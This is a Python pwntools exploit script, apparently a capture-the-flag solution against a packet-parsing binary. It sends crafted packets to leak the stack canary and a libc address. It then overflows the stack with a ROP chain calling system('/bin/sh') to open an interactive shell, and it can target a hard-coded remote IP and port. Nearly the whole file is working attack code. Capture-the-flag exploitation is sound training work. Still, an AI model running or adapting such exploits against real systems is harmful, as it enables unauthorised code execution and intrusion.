#!/usr/bin/env python3

from pwn import *
from pack import *
context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
ld = ELF('ld-2.35.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*main+148
        # b*unpack+79
        # b*main+790
        b*0x4025AA 
        b*0x0402692   
        c
        ''')
        sleep(1)

#  nc 67.223.119.69 3637 
if args.REMOTE:
    p = remote('67.223.119.69', 3637)
    # p = remote('0', 1338)
else:
    p = process([exe.path])
NUMBER = 0
KEY    = 1
BIN    = 2
SIGNAL = 3
GDB()
"""
canary: 0x3009
"""
load  = [
{
    'type': NUMBER,
    'value': 0x29
},
{
    'type':  BIN,
    'data': b'\0'*0x36
}
]
packet = create_packet(0x1337, pack_data(load))

sa(b'> ', packet)

load  = [
{
    'type': NUMBER,
    'value': 0xffff
},
{
    'type': BIN,
    'data': b'w'*(0x2fe0)
    # 'data': b'w'*(0x7ff)

}
]
packet = create_packet(0x1337, pack_data(load))
sa(b'> ', packet)
# input("next?")

load  = [
{
    'type': BIN,
    'data': b'f'*0x29
}
]
packet = create_packet(0xdead, pack_data(load))

sa(b'> ', packet)


packet = create_packet(0x700, p8(0))

sa(b'> ', packet)

info(f'start leak canary')

a = p.recvuntil(b'No data available !', drop=True)
info(f'---------------------------------------------------------')
print(a)
canary = u64(a[len(a)-10:len(a)-3] + b'\0') << 8
info(f'canary: {hex(canary)}')

load  = [
{
    'type': NUMBER,
    'value': 0x38
},
{
    'type': BIN,
    'data': b'\0'*(0x36)

}
]
packet = create_packet(0x1337, pack_data(load))


sa(b'> ', packet)

load  = [
{
    'type': NUMBER,
    'value': 0xfffff
},
{
    'type': BIN,
    'data': b'w'*(0x2fe0)

}
]
packet = create_packet(0x1337, pack_data(load))

sa(b'> ', packet)

load  = [
{
    'type': BIN,
    'data': b'f'*0x38
}
]
packet = create_packet(0xdead, pack_data(load))

sa(b'> ', packet)

packet = create_packet(0x700, b'\0')

sa(b'> ', packet)

info(f'-'*0x10)
info(f'leak libc')
a = p.recvuntil(b'No data available !', drop=True)
info(f'---------------------------------------------------------')
print(a)
libc_leak = u64(a[len(a)-8:len(a)-2] + b'\0\0')
libc.address = libc_leak - 0x29d90
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

load  = [
{
    'type': NUMBER,
    'value': 0x100
},
{
    'type': BIN,
    'data': b'\0'

}
]
packet = create_packet(0x1337, pack_data(load))


sa(b'> ', packet)

load  = [
{
    'type': NUMBER,
    'value': 0xfffff
},
{
    'type': BIN,
    'data': b'h'*(0x2fe0)

}
]
packet = create_packet(0x1337, pack_data(load))

sa(b'> ', packet)

pop_rdi  =0x000000000002a3e5 + libc.address
win = flat(
    b'a'*0x28,
    canary,
    1,
    pop_rdi+1,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
)

load  = [
{
    'type': BIN,
    'data': win.ljust(0x100, b'k')
}
]
packet = create_packet(0xdead, pack_data(load))

sa(b'> ', packet)

# 0x9da5
p.interactive()

"""

typedef struct{
    int idx;

}
"""
